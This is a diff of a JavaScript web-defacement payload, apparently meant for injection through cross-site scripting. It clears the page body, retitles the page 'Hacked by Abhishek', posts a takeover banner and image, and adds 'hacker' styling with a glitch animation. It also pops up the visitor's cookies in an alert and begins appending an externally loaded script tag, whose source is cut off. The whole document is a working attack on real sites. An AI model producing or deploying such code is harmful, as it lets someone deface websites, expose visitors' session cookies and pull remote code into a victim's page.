@@ -2,11 +2,11 @@
 document.body.innerHTML = "";
 
 // Set the document title
-document.title = "New Website Title";
+document.title = "Hacked by Abhishek";
 
 // Create and append new elements
 var newHeader = document.createElement('h1');
-newHeader.textContent = "This website is under Abhishek Control now, I captured your cookies!";
+newHeader.textContent = "This website is under Abhishek's control now!";
 document.body.appendChild(newHeader);
 
 var newParagraph = document.createElement('p');
@@ -20,19 +20,51 @@ newImage.alt = "You have been hacked";
 newImage.style.maxWidth = "100%";
 document.body.appendChild(newImage);
 
-// Apply some basic styles
-document.body.style.fontFamily = "Arial, sans-serif";
-document.body.style.backgroundColor = "#f0f0f0";
+// Apply hacker style
+document.body.style.fontFamily = "'Courier New', Courier, monospace";
+document.body.style.backgroundColor = "#000";
+document.body.style.color = "#0f0";
 document.body.style.margin = "0";
 document.body.style.padding = "20px";
+document.body.style.overflow = "hidden";
 
-newHeader.style.color = "#333";
-newParagraph.style.color = "#666";
+// Style the header
+newHeader.style.fontSize = "2em";
+newHeader.style.textAlign = "center";
+newHeader.style.marginBottom = "20px";
+newHeader.style.textShadow = "0 0 10px #0f0, 0 0 20px #0f0";
+
+// Style the paragraph
+newParagraph.style.fontSize = "1.2em";
+newParagraph.style.textAlign = "center";
+newParagraph.style.marginBottom = "20px";
+newParagraph.style.textShadow = "0 0 5px #0f0";
+
+// Style the image
 newImage.style.display = "block";
+newImage.style.margin = "0 auto";
 newImage.style.marginTop = "20px";
+newImage.style.boxShadow = "0 0 30px #0f0";
+
+// Create glitch effect using CSS animations
+var style = document.createElement('style');
+style.textContent = `
+@keyframes glitch {
+  0% { transform: translate(0); }
+  20% { transform: translate(-2px, 2px); }
+  40% { transform: translate(-2px, -2px); }
+  60% { transform: translate(2px, 2px); }
+  80% { transform: translate(2px, -2px); }
+  100% { transform: translate(0); }
+}
+h1, p, img {
+  animation: glitch 1s infinite;
+}
+`;
+document.head.appendChild(style);
 
 // Alert cookies
-alert("here_are_your_cookies:_ " + document.cookie);
+alert("Here are your cookies: " + document.cookie);
 
 // Dynamically load an external script
 var script = document.createElement('script');
